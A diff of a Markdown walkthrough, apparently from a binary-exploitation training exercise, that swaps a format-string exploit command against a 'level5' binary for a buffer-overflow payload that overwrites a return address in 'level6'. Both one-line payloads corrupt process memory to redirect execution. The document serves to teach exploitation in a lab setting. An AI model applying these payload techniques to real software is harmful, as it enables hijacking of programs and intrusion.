@@ -141,8 +141,7 @@ As seen in the [source.asm](./source.asm) file, the entrypoint address of the `o
 
 In the same fashion as the previous exercice, we assign the value to the target address by writing the required amount of characters.
 ```sh
-# We write a total of 134513828 characters (4 + 134513824) to assign it to target address.
-$ (printf "%b\n" "\070\230\004\010%134513824c%4\$n"; cat -) | ./level5
+$ ./level6 "$(printf "%72c%b" "c" "\124\204\004\010")"
 ```
 
 And there we are
